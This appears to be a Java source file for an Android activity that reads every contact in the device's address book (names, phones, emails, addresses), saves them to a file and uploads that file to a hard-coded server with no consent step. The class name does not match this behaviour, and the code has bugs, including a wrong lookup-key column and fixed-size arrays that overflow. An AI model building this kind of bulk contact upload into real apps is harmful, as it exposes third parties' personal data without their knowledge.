package com.detect;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.TextView;

public class DetectCallActivity extends Activity {

	private static final Uri URI = ContactsContract.Contacts.CONTENT_URI;
	private static final Uri PURI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
	private static final Uri EURI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
	private static final Uri AURI = ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI;
	private static final String ID = ContactsContract.Contacts._ID;
	private static final String DNAME = ContactsContract.Contacts.DISPLAY_NAME;
	private static final String HPN = ContactsContract.Contacts.HAS_PHONE_NUMBER;
	private static final String LOOKY = ContactsContract.Contacts.LOOKUP_KEY;
	private static final String CID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
	private static final String EID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
	private static final String AID = ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID;
	private static final String PNUM = ContactsContract.CommonDataKinds.Phone.NUMBER;
	private static final String PHONETYPE = ContactsContract.CommonDataKinds.Phone.TYPE;
	private static final String EMAIL = ContactsContract.CommonDataKinds.Email.DATA;
	private static final String EMAILTYPE = ContactsContract.CommonDataKinds.Email.TYPE;
	private static final String STREET = ContactsContract.CommonDataKinds.StructuredPostal.STREET;
	private static final String CITY = ContactsContract.CommonDataKinds.StructuredPostal.CITY;
	private static final String STATE = ContactsContract.CommonDataKinds.StructuredPostal.REGION;
	private static final String POSTCODE = ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE;
	private static final String COUNTRY = ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY;

	private String id;
	private String lookupKey;
	private String name;
	private String street;
	private String city;
	private String state;
	private String postcode;
	private String country;
	private String ph[];
	private String phType[];
	private String em[];
	private String emType[];
	private static File root;
	private int emcounter;
	private int phcounter;
	private int addcounter;
	private TextView tv;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {

		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		tv = (TextView) findViewById(R.id.TextView01);

		em = new String[5];
		emType = new String[5];
		ph = new String[5];
		phType = new String[5];

		checkExternalMedia();

		File dir = new File(root.getAbsolutePath() + "/download");
		dir.mkdirs();
		File file = new File(dir, "phone.txt");
		tv.append("Wrote " + file + "\nfor following contacts:\n");

		try {
			FileOutputStream f = new FileOutputStream(file);
			PrintWriter pw = new PrintWriter(f);

			ContentResolver cr = getContentResolver();
			Cursor cu = cr.query(URI, null, null, null, null);

			if (cu.getCount() > 0) {

				while (cu.moveToNext()) {

					street = "";
					city = "";
					state = "";
					postcode = "";
					country = "";

					id = cu.getString(cu.getColumnIndex(ID));
					name = cu.getString(cu.getColumnIndex(DNAME));
					lookupKey = cu.getString(cu.getColumnIndex(HPN));

					tv.append("\n" + id + " " + name);

					phcounter = 0;
					if (Integer.parseInt(cu.getString(cu.getColumnIndex(HPN))) > 0) {
						Cursor pCur = cr.query(PURI, null, CID + " = ?",
								new String[] { id }, null);
						while (pCur.moveToNext()) {
							ph[phcounter] = pCur.getString(pCur
									.getColumnIndex(PNUM));
							phType[phcounter] = pCur.getString(pCur
									.getColumnIndex(PHONETYPE));
							phcounter++;
						}
						pCur.close();
					}

					emcounter = 0;
					Cursor emailCur = cr.query(EURI, null, EID + " = ?",
							new String[] { id }, null);
					while (emailCur.moveToNext()) {
						em[emcounter] = emailCur.getString(emailCur
								.getColumnIndex(EMAIL));
						emType[emcounter] = emailCur.getString(emailCur
								.getColumnIndex(EMAILTYPE));
						emcounter++;
					}
					emailCur.close();

					addcounter = 0;
					Cursor addCur = cr.query(AURI, null, AID + " = ?",
							new String[] { id }, null);
					while (addCur.moveToNext()) {
						street = addCur
								.getString(addCur.getColumnIndex(STREET));
						city = addCur.getString(addCur.getColumnIndex(CITY));
						state = addCur.getString(addCur.getColumnIndex(STATE));
						postcode = addCur.getString(addCur
								.getColumnIndex(POSTCODE));
						country = addCur.getString(addCur
								.getColumnIndex(COUNTRY));
						addcounter++;
					}
					addCur.close();

					pw.println(name + " ID=" + id + " LOOKUP_KEY=" + lookupKey);

					for (int i = 0; i < phcounter; i++) {
						pw.println("   phone=" + ph[i] + " type=" + phType[i]
								+ " (" + getPhoneType(phType[i]) + ") ");
					}

					for (int i = 0; i < emcounter; i++) {
						pw.println("   email=" + em[i] + " type=" + emType[i]
								+ " (" + getEmailType(emType[i]) + ") ");
					}

					if (addcounter > 0) {
						if (street != null)
							pw.println("   street=" + street);
						if (city != null)
							pw.println("   city=" + city);
						if (state != null)
							pw.println("   state/region=" + state);
						if (postcode != null)
							pw.println("   postcode=" + postcode);
						if (country != null)
							pw.println("   country=" + country);
					}
				}
			}

			pw.flush();
			pw.close();
			f.close();
			upload_file();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			Log.i("MEDIA",
					"*************** File not found. Did you"
							+ " add a WRITE_EXTERNAL_STORAGE permission to the manifest file? ");
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	public void upload_file() {

		HttpURLConnection conn = null;
		DataOutputStream dos = null;
		DataInputStream inStream = null;

		String exsistingFileName = root.getAbsolutePath()
				+ "/download/phone.txt";

		String lineEnd = "\r\n";
		String twoHyphens = "--";
		String boundary = "*****";

		int bytesRead, bytesAvailable, bufferSize;

		byte[] buffer;

		int maxBufferSize = 1 * 1024 * 1024;

		String urlString = "http://192.168.1.8/project/call/upload.php";
		// String urlString =
		// "http://wingstechsolutions.com/android/project/insert.php";

		try {

			Log.e("MediaPlayer", "Inside second Method");

			FileInputStream fileInputStream = new FileInputStream(new File(
					exsistingFileName));

			URL url = new URL(urlString);

			conn = (HttpURLConnection) url.openConnection();

			conn.setDoInput(true);

			// Allow Outputs
			conn.setDoOutput(true);

			// Don't use a cached copy.
			conn.setUseCaches(false);

			// Use a post method.
			conn.setRequestMethod("POST");

			conn.setRequestProperty("Connection", "Keep-Alive");

			conn.setRequestProperty("Content-Type",
					"multipart/form-data;boundary=" + boundary);

			dos = new DataOutputStream(conn.getOutputStream());

			dos.writeBytes(twoHyphens + boundary + lineEnd);
			dos.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
					+ exsistingFileName + "\"" + lineEnd);
			dos.writeBytes(lineEnd);

			Log.e("MediaPlayer", "Headers are written");

			bytesAvailable = fileInputStream.available();
			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			buffer = new byte[bufferSize];

			bytesRead = fileInputStream.read(buffer, 0, bufferSize);

			while (bytesRead > 0) {
				dos.write(buffer, 0, bufferSize);
				bytesAvailable = fileInputStream.available();
				bufferSize = Math.min(bytesAvailable, maxBufferSize);
				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			}

			dos.writeBytes(lineEnd);

			dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

			BufferedReader in = new BufferedReader(new InputStreamReader(
					conn.getInputStream()));
			String inputLine;

			while ((inputLine = in.readLine()) != null)
				// tv.append(inputLine);

				Log.e("MediaPlayer", "File is written");
			fileInputStream.close();
			dos.flush();
			dos.close();

		} catch (MalformedURLException ex) {
			Log.e("MediaPlayer", "error: " + ex.getMessage(), ex);
		}

		catch (IOException ioe) {
			Log.e("MediaPlayer", "error: " + ioe.getMessage(), ioe);
		}

		try {
			inStream = new DataInputStream(conn.getInputStream());
			String str;

			while ((str = inStream.readLine()) != null) {
				Log.e("MediaPlayer", "Server Response" + str);
			}

			inStream.close();

		} catch (IOException ioex) {
			Log.e("MediaPlayer", "error: " + ioex.getMessage(), ioex);
		}
	}

	private void checkExternalMedia() {
		// Check external media availability. This is adapted from
		// http://developer.android.com/guide/topics/data/data-storage.html#filesExternal
		boolean mExternalStorageAvailable = false;
		boolean mExternalStorageWriteable = false;
		String state = Environment.getExternalStorageState();

		if (Environment.MEDIA_MOUNTED.equals(state)) {
			// We can read and write the media
			mExternalStorageAvailable = mExternalStorageWriteable = true;
		} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
			// We can only read the media
			mExternalStorageAvailable = true;
			mExternalStorageWriteable = false;
		} else {
			// Can't read or write
			mExternalStorageAvailable = mExternalStorageWriteable = false;
		}

		// Find the root of the external storage and output external storage
		// info to screen
		root = android.os.Environment.getExternalStorageDirectory();
		tv.append("External storage: Exists=" + mExternalStorageAvailable
				+ ", Writable=" + mExternalStorageWriteable + " Root=" + root
				+ "\n");
	}

	private String getPhoneType(String index) {
		if (index.trim().equals("1")) {
			return "home";
		} else if (index.trim().equals("2")) {
			return "mobile";
		} else if (index.trim().equals("3")) {
			return "work";
		} else if (index.trim().equals("7")) {
			return "other";
		} else {
			return "?";
		}
	}

	private String getEmailType(String index) {
		if (index.trim().equals("1")) {
			return "home";
		} else if (index.trim().equals("2")) {
			return "work";
		} else if (index.trim().equals("3")) {
			return "other";
		} else if (index.trim().equals("4")) {
			return "mobile";
		} else {
			return "?";
		}
	}

}